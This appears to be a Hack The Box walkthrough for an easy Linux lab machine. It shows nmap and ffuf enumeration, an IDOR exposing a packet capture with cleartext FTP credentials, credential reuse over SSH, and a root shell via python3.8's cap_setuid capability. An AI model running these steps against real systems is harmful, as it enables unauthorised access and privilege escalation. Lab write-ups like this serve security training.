---
date: 2026-01-05
categories: [Linux, Easy]
---

<img width="300" height="300" alt="Union" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/70ea3357a2d090af11a0953ec8717e90.png" />

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [InfoSecJack](https://app.hackthebox.com/users/52045)    | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---






## Enumeration

- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.245 -oG scan
	/opt/extractports scan
	nmap -p21,22,80 -Pn -sCV 10.10.10.245 -oN ports
	```
	
	<img width="953" height="248" alt="image" src="https://github.com/user-attachments/assets/5633262b-8afe-43ca-b9d7-a25df76e6c58" />

## Web enumeration

- While browsing the web application, I noticed that accessing the URL

	```python
	http://10.10.10.245/data/3
	```

- displayed a page with a download button pointing to

	```python
	http://10.10.10.245/download/3
	```

- Suspecting insecure direct object references (IDOR), I performed fuzzing against the `/data/` endpoint to identify other accessible resources:

	```python
	ffuf -c -t 50 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  -u "http://10.10.10.245/data/FUZZ" --mc=200
	```

- This revealed additional files, including

	```python
	http://10.10.10.245/download/0
	```

- I downloaded this file and identified it as a **Wireshark capture**.

## Credential Disclosure via Packet Capture

- Upon analyzing the PCAP file, I discovered an FTP session where credentials were transmitted in clear text.  The credentials belonged to the user **nathan**.

	<img width="1273" height="440" alt="image" src="https://github.com/user-attachments/assets/959a966c-2c3b-4bff-8a26-091eafa13769" />

- Using these credentials, I authenticated to the FTP service and retrieved the user flag

	```python
	ftp 10.10.10.245
	```

## Privilege Escalation

- Since SSH was also available, I reused the same credentials to obtain a shell on the system

	```python
	ssh nathan@10.10.10.245
	```

- After gaining access, I enumerated Linux capabilities assigned to binaries

  ```python
  getcap -r / 2>/dev/null
  ```


- The binary `/usr/bin/python3.8` had the following capabilities

  ```python
  cap_setuid,cap_net_bind_service+eip
  ```

- The `cap_setuid` capability allows changing the effective UID, which can be abused to escalate privileges.
- I spawned a Python shell and changed the UID to `0` (root):

	```python
	/usr/bin/python3.8
  >>> 	import os
  >>> 	os.setuid(0)
  >>> 	os.system("/bin/bash")
	```

- This resulted in a root shell, allowing me to retrieve the root flag.
